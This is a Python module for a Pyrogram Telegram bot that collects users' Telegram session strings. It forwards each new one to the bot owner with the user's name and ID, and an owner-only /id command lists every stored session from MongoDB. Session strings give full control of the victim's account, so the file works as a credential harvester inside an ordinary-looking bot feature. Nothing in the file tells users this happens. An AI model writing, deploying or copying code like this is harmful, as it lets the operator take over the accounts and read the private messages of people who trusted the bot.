# ---------------------------------------------------
# File Name: session.py
# Description: Notifies the bot owner whenever a new user session is
#              saved in MongoDB and lets the owner list every stored
#              session with the /id command.
# Author: Perry
# Created: 2025-01-11
# Last Modified: 2025-01-11
# Version: 2.0.5
# License: MIT License
# ---------------------------------------------------

from pyrogram import filters
from pyrogram.errors import RPCError
from devgagan import app
from config import OWNER_ID
from devgagan.core.mongo.db import get_all_sessions

# Telegram hard limit is 4096 characters per message, keep some headroom.
MAX_MESSAGE_LENGTH = 3500


async def notify_owner_new_session(client, user_id, session_string, user=None):
    """Send the bot owner(s) the newly generated session id (highlighted / tap-to-copy)
    along with the name of the user who just logged in.
    """
    name = None
    if user is not None:
        name = getattr(user, "first_name", None) or getattr(user, "username", None)

    if not name:
        try:
            fetched_user = await client.get_users(user_id)
            name = fetched_user.first_name or fetched_user.username or "Unknown"
        except Exception:
            name = "Unknown"

    text = (
        "🔔 **New Login Detected!**\n\n"
        f"👤 **Name:** {name}\n"
        f"🆔 **User ID:** `{user_id}`\n\n"
        "🔑 **Session ID:**\n"
        f"`{session_string}`"
    )

    for owner_id in OWNER_ID:
        try:
            await client.send_message(owner_id, text)
        except Exception:
            pass


def _chunk_text(text, limit=MAX_MESSAGE_LENGTH):
    """Split text into chunks not exceeding `limit` characters, breaking on newlines
    where possible so the output stays readable.
    """
    chunks = []
    current = ""
    for line in text.split("\n"):
        if len(current) + len(line) + 1 > limit:
            if current:
                chunks.append(current)
            current = line
        else:
            current = f"{current}\n{line}" if current else line
    if current:
        chunks.append(current)
    return chunks


@app.on_message(filters.command("id") & filters.user(OWNER_ID))
async def list_all_sessions(client, message):
    sessions = await get_all_sessions()

    if not sessions:
        await message.reply("❌ No sessions found in the database.")
        return

    lines = [f"🗂 **Total Sessions Found:** `{len(sessions)}`\n"]
    for index, doc in enumerate(sessions, start=1):
        user_id = doc.get("_id")
        session_string = doc.get("session")
        lines.append(
            f"**{index}.** 🆔 User: `{user_id}`\n🔑 Session:\n`{session_string}`\n"
        )

    full_text = "\n".join(lines)
    for chunk in _chunk_text(full_text):
        try:
            await message.reply(chunk)
        except RPCError:
            pass
